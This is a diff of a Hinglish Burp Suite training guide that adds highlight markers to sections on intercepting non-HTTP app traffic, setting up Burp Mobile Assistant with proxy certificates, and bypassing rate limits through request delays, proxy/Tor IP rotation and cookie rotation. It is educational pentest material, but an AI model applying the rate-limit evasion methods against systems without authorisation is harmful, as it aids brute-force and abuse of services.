 ## ❓ 15. FAQ (Interview Questions)
 
-**Q1: WebSocket aur HTTP mein kya antar hai?**  
-A1: WebSocket persistent full-duplex connection hai, HTTP short-lived request-response.  
+[[HL::**Q1: WebSocket aur HTTP mein kya antar hai?**::HL]]  
+[[HL::A1: WebSocket persistent full-duplex connection hai, HTTP short-lived request-response::HL]].  
 
 **Q2: Burp mein WebSocket traffic kaise intercept karein?**  
 A2: Proxy → Intercept → WebSocket tab mein checkbox enable karo.  
@@ -12256,12 +12256,12 @@ A5: Proxy listener mein "Support invisible proxying" checkbox tick karna hota ha
 
 Socho tum ek **Jasoos** ho. Tumne socha tha ki villain sirf letters (HTTP) se baat karega. Lekin villain **walkie-talkie (custom protocol)** aur **wireless mic (MQTT)** bhi use kar raha hai. Tum sirf letters padh rahe ho, toh villain ki poori planning miss kar rahe ho.
 
-**Non-HTTP traffic** exactly yahi hai. Mobile apps sirf HTTP/HTTPS use nahi karti. Kuch apps use karti hain:  
-- **XMPP** – chat apps (WhatsApp type)  
-- **MQTT** – IoT devices (light bulb, smart watch)  
-- **Raw TCP** – games, custom APIs  
+[[HL::**Non-HTTP traffic** exactly yahi hai. Mobile apps sirf HTTP/HTTPS use nahi karti. Kuch apps use karti hain:::HL]]  
+- [[HL::**XMPP** – chat apps (WhatsApp type)::HL]]  
+- [[HL::**MQTT** – IoT devices (light bulb, smart watch)::HL]]  
+- [[HL::**Raw TCP** – games, custom APIs::HL]]  
 
-Burp normally HTTP/HTTPS hi samajhta hai. Lekin invisible proxy + raw capture se tum inhe bhi intercept kar sakte ho.
+[[HL::Burp normally HTTP/HTTPS hi samajhta hai. Lekin invisible proxy + raw capture se tum inhe bhi intercept kar sakte ho::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer)
 
@@ -12269,11 +12269,11 @@ Burp normally HTTP/HTTPS hi samajhta hai. Lekin invisible proxy + raw capture se
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Aajkal ki mobile apps sirf REST APIs use nahi karti. Real-time features ke liye WebSocket, chat ke liye XMPP, IoT devices ke liye MQTT – ye sab common hain. Agar hum sirf HTTP history dekhenge, toh inka traffic miss ho jayega. Vulnerabilities inmein bhi ho sakti hain – jaise XMPP messages mein IDOR, MQTT mein topic enumeration, raw TCP mein command injection.
+**[[HL::Problem::HL]]:**  
+[[HL::Aajkal ki mobile apps sirf REST APIs use nahi karti. Real-time features ke liye WebSocket, chat ke liye XMPP, IoT devices ke liye MQTT – ye sab common hain. Agar hum sirf HTTP history dekhenge, toh inka traffic miss ho jayega. Vulnerabilities inmein bhi ho sakti hain – jaise XMPP messages mein IDOR, MQTT mein topic enumeration, raw TCP mein command injection.::HL]]
 
-**Solution:**  
-Burp ko aise setup karo ki woh saara TCP traffic capture kare (invisible proxy mode mein), phir manually analyze karo ki kis port par kaunsa protocol chal raha hai, aur us hisaab se test karo.
+[[HL::**Solution:**::HL]]  
+[[HL::Burp ko aise setup karo ki woh saara TCP traffic capture kare (invisible proxy mode mein), phir manually analyze karo ki kis port par kaunsa protocol chal raha hai, aur us hisaab se test karo::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
@@ -12460,49 +12460,49 @@ A5: Length fields update karna, protocol structure respect karna, nahi toh reque
 
 ## 🐣 2. Samjhane ke liye (Simple Analogy)
 
-Socho tum mobile app test kar rahe ho. Har baar:  
-- WiFi proxy settings mein jaana  
-- IP address aur port type karna  
-- Certificate download karna, install karna, trust karna  
-- Baar baar proxy on/off karna  
+[[HL::Socho tum mobile app test kar rahe ho. Har baar:::HL]]  
+- [[HL::WiFi proxy settings mein jaana::HL]]  
+- [[HL::IP address aur port type karna::HL]]  
+- [[HL::Certificate download karna, install karna, trust karna::HL]]  
+- [[HL::Baar baar proxy on/off karna::HL]]  
 
-Ye sab kaam **bore kar dete hain**, aur time waste hota hai.  
+[[HL::Ye sab kaam **bore kar dete hain**, aur time waste hota hai.::HL]]  
 
-**Burp Mobile Assistant** ek **remote control** ki tarah hai. Ek button se proxy set karo, ek click mein certificate install karo, QR code scan karo aur configuration automatically apply ho jaye. Jaise TV ka remote – ek click mein channel change.
+[[HL::**Burp Mobile Assistant** ek **remote control** ki tarah hai. Ek button se proxy set karo, ek click mein certificate install karo, QR code scan karo aur configuration automatically apply ho jaye. Jaise TV ka remote – ek click mein channel change::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer)
 
-**Burp Mobile Assistant** ek Burp Suite extension hai (BApp) jo mobile device par proxy configuration aur certificate installation ko automate karta hai. Android ke liye ek dedicated app hota hai jo Burp se communicate karta hai. iOS mein manual thoda hai, lekin QR code scan se proxy config set ho jati hai.
+[[HL::**Burp Mobile Assistant** ek Burp Suite extension hai (BApp) jo mobile device par proxy configuration aur certificate installation ko automate karta hai. Android ke liye ek dedicated app hota hai jo Burp se communicate karta hai. iOS mein manual thoda hai, lekin QR code scan se proxy config set ho jati hai::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
 
-**Problem:**  
-Mobile testing mein baar-baar ye steps repeat karne padte hain:  
-- WiFi settings mein jaake proxy set karo (IP aur port daalo)  
-- Burp CA certificate download karo (http://burp)  
-- Android mein certificate install karo (Settings → Security → Install from storage)  
-- Android 7+ mein user certificates ko trust karne ke liye additional steps  
-- Testing ke baad proxy hatao  
+**[[HL::Problem::HL]]:**  
+[[HL::Mobile testing mein baar-baar ye steps repeat karne padte hain:::HL]]  
+- [[HL::WiFi settings mein jaake proxy set karo (IP aur port daalo)::HL]]  
+- [[HL::Burp CA certificate download karo (http://burp)::HL]]  
+- [[HL::Android mein certificate install karo (Settings → Security → Install from storage)::HL]]  
+- [[HL::Android 7+ mein user certificates ko trust karne ke liye additional steps::HL]]  
+- [[HL::Testing ke baad proxy hatao::HL]]  
 
-Har naye device, har naye test session mein ye time waste.
+[[HL::Har naye device, har naye test session mein ye time waste::HL]].
 
-**Solution:**  
-Burp Mobile Assistant (Android) ek app provide karta hai jo Burp se connect hota hai. Tum QR code scan karte ho, aur app automatically proxy set kar deta hai, certificate install kar deta hai. Ek click mein kaam ho jata hai.
+**[[HL::Solution::HL]]:**  
+[[HL::Burp Mobile Assistant (Android) ek app provide karta hai jo Burp se connect hota hai. Tum QR code scan karte ho, aur app automatically proxy set kar deta hai, certificate install kar deta hai. Ek click mein kaam ho jata hai::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega
 
-**Burp mein extension install karne ke baad:**
-- Extender → BApp Store → Burp Mobile Assistant → Install.  
-- Extension add ho jayegi. **Mobile Assistant** tab dikhega Burp mein.  
+**[[HL::Burp mein extension install karne ke baad::HL]]:**
+- [[HL::Extender → BApp Store → Burp Mobile Assistant → Install.::HL]]  
+- [[HL::Extension add ho jayegi. **Mobile Assistant** tab dikhega Burp mein.::HL]]  
 
-**Mobile Assistant tab:**
-- **QR Code** dikhega – isme encoded hai Burp listener details (IP, port).  
-- **Status** – connected devices dikhenge.  
-- **Buttons** – Start/Stop proxy, Install certificate, etc.
+**[[HL::Mobile Assistant tab::HL]]:**
+- [[HL::**QR Code** dikhega – isme encoded hai Burp listener details (IP, port).::HL]]  
+- [[HL::**Status** – connected devices dikhenge.::HL]]  
+- [[HL::**Buttons** – Start/Stop proxy, Install certificate, etc.::HL]]
 
-**Android app mein:**
-- App open karo → Scan QR code → Proxy automatically set ho jayega.  
-- "Install Certificate" button – ek click mein certificate install.
+**[[HL::Android app mein::HL]]:**
+- [[HL::App open karo → Scan QR code → Proxy automatically set ho jayega.::HL]]  
+- [[HL::"Install Certificate" button – ek click mein certificate install::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working)
 
@@ -12517,42 +12517,42 @@ Burp Mobile Assistant (Android) ek app provide karta hai jo Burp se connect hota
 
 ### Android Setup
 
-**Step 1: Burp Mobile Assistant install karo**
-- Burp open karo.  
-- **Extender → BApp Store** → Search "Mobile Assistant" → Install.  
-- Install hone ke baad, **Mobile Assistant** tab dikhega.
+[[HL::**Step 1: Burp Mobile Assistant install karo**::HL]]
+- [[HL::Burp open karo.::HL]]  
+- [[HL::**Extender → BApp Store** → Search "Mobile Assistant" → Install.::HL]]  
+- [[HL::Install hone ke baad, **Mobile Assistant** tab dikhega.::HL]]
 
-**Step 2: Android device par app install karo**
-- Play Store se "Burp Suite Mobile Assistant" search karo (official PortSwigger app).  
-- Install karo.
+[[HL::**Step 2: Android device par app install karo**::HL]]
+- [[HL::Play Store se "Burp Suite Mobile Assistant" search karo (official PortSwigger app).::HL]]  
+- [[HL::Install karo.::HL]]
 
-**Step 3: Burp mein QR code generate karo**
-- Mobile Assistant tab mein, ensure karo ki Burp listener chal raha hai (e.g., 8080 on all interfaces).  
-- Tab par ek QR code dikhega.  
+[[HL::**Step 3: Burp mein QR code generate karo**::HL]]
+- [[HL::Mobile Assistant tab mein, ensure karo ki Burp listener chal raha hai (e.g., 8080 on all interfaces).::HL]]  
+- [[HL::Tab par ek QR code dikhega.::HL]]  
 
-**Step 4: Android app se QR code scan karo**
-- Android app open karo.  
-- "Scan QR Code" button dabao.  
-- Phone camera se Burp screen ka QR code scan karo.  
+[[HL::**Step 4: Android app se QR code scan karo**::HL]]
+- [[HL::Android app open karo.::HL]]  
+- [[HL::"Scan QR Code" button dabao.::HL]]  
+- [[HL::Phone camera se Burp screen ka QR code scan karo.::HL]]  
 
-**Step 5: Proxy auto-configure ho jayega**
-- App automatically WiFi proxy settings set kar dega (ya VPN mode use karega).  
-- Status "Connected" dikhega.
+[[HL::**Step 5: Proxy auto-configure ho jayega**::HL]]
+- [[HL::App automatically WiFi proxy settings set kar dega (ya VPN mode use karega).::HL]]  
+- [[HL::Status "Connected" dikhega::HL]].
 
-**Step 6: Certificate install karo**
-- Android app mein "Install Certificate" button dabao.  
-- App Burp se certificate download karega aur installation guide dekhaega.  
-- Android settings mein jaakar certificate install karo (ya app guided steps follow karo).  
-- Android 7+ ke liye, ho sakta hai additional steps chahiye (like adding certificate to system store, which needs root). Lekin user certificate kaam karega agar app targetSdkVersion < 24, ya agar app ke manifest mein `network_security_config` mein user certificates allowed hain.
+[[HL::**Step 6: Certificate install karo**::HL]]
+- [[HL::Android app mein "Install Certificate" button dabao.::HL]]  
+- [[HL::App Burp se certificate download karega aur installation guide dekhaega.::HL]]  
+- [[HL::Android settings mein jaakar certificate install karo (ya app guided steps follow karo).::HL]]  
+- [[HL::Android 7+ ke liye, ho sakta hai additional steps chahiye (like adding certificate to system store, which needs root). Lekin user certificate kaam karega agar app targetSdkVersion < 24, ya agar app ke manifest mein `network_security_config` mein user certificates allowed hain.::HL]]
 
-**Step 7: Verify**
-- Browser open karo, koi HTTP site kholo.  
-- Burp mein request aana chahiye.  
-- Agar certificate trust nahi ho raha, toh browser warning dega – us warning ko accept karo (test environment hai).
+[[HL::**Step 7: Verify**::HL]]
+- [[HL::Browser open karo, koi HTTP site kholo.::HL]]  
+- [[HL::Burp mein request aana chahiye.::HL]]  
+- [[HL::Agar certificate trust nahi ho raha, toh browser warning dega – us warning ko accept karo (test environment hai).::HL]]
 
-**Step 8: Testing ke baad proxy disable karo**
-- Android app mein "Disable Proxy" button dabao.  
-- Ya QR code scan karo with "Disable" option.
+[[HL::**Step 8: Testing ke baad proxy disable karo**::HL]]
+- [[HL::Android app mein "Disable Proxy" button dabao.::HL]]  
+- [[HL::Ya QR code scan karo with "Disable" option::HL]].
 
 ### iOS Setup
 
@@ -13091,13 +13091,13 @@ Socho ek tap se paani nikal raha hai, lekin regulator laga hai ki ek minute mein
 
 ### 📖 Technical Definition (Interview Answer)
 
-**Rate limiting bypass** techniques are used to circumvent restrictions on the number of requests a client can make within a given time. Common methods include introducing delays between requests, rotating IP addresses via proxies, and rotating session identifiers (cookies) to appear as different users.
+[[HL::**Rate limiting bypass** techniques are used to circumvent restrictions on the number of requests a client can make within a given time. Common methods include introducing delays between requests, rotating IP addresses via proxies, and rotating session identifiers (cookies) to appear as different users.::HL]]
 
-**Keywords Breakdown:**
-- **Rate limiting:** Server per IP per time kitni requests allow karta hai.
-- **Delay:** Requests ke beech time gap.
-- **IP rotation:** Different IP se requests bhejna (proxies, VPN, Tor).
-- **Session rotation:** Har kuch requests baad cookies clear karke naya session start karna.
+**[[HL::Keywords Breakdown::HL]]:**
+- [[HL::**Rate limiting:** Server per IP per time kitni requests allow karta hai.::HL]]
+- [[HL::**Delay:** Requests ke beech time gap.::HL]]
+- [[HL::**IP rotation:** Different IP se requests bhejna (proxies, VPN, Tor).::HL]]
+- [[HL::**Session rotation:** Har kuch requests baad cookies clear karke naya session start karna::HL]].
 
 ### 🧠 Zaroorat Kyun Hai? (Why use it?)
 
@@ -13109,11 +13109,11 @@ Delay daal kar requests slow karo, ya IP rotate karo taaki har IP se limited req
 
 ### 🔍 Visual - Jab Screen Par Kya Dikhega
 
-**Location:**  
-Burp Suite mein Intruder ke andar "Resource Pool" settings hoti hai. Yahan tum delay configure kar sakte ho. IP rotation ke liye upstream proxy settings use kar sakte ho (User options → Connections → Upstream Proxy Servers). Session rotation ke liye Macro ya Extension use karna hoga.
+**[[HL::Location::HL]]:**  
+[[HL::Burp Suite mein Intruder ke andar "Resource Pool" settings hoti hai. Yahan tum delay configure kar sakte ho. IP rotation ke liye upstream proxy settings use kar sakte ho (User options → Connections → Upstream Proxy Servers). Session rotation ke liye Macro ya Extension use karna hoga.::HL]]
 
-**Appearance:**  
-Intruder ke "Attack Configuration" mein "Resource pool" section dikhega. Wahan tum "Maximum concurrent requests" aur "Delay between requests" set kar sakte ho.
+[[HL::**Appearance:**::HL]]  
+[[HL::Intruder ke "Attack Configuration" mein "Resource pool" section dikhega. Wahan tum "Maximum concurrent requests" aur "Delay between requests" set kar sakte ho::HL]].
 
 ### ⚙️ Under the Hood (Technical Working)
 
@@ -17335,3 +17335,6 @@ Beta, ye the **Module 21 (Cloud Security & Team Collaboration)** aur **Module 22
 **Koi confusion ho toh poochh lena. Main hoon na tera TechGuru!** 💪
 
 ========================================================================================
+
+
+⚠️ Not found: [Payloads tab jaake wordlist daalo, phir "Start attack".], [Options tab open karoge toh kuch sections dikhenge:], [Step 3: Next par click karo "Next" button dabao.], [Payloads tab open karoge toh kuch aisa dikhega:], [Left side ke upar Go button (send ke liye).], [tep 5: Payloads Tab – Wordlist daalo], [Step 1: Request Intruder mein bhejo], [Step 1: Do requests capture karo], [Step 3: Successful hit dhundho.], [Step 1: Request select karo], [3. WebSockets History:], [1. Scope Inclusion:], [PUT Method ka flow:], [2. Audit ka kaam:], [raha)], [Prob], [hain]
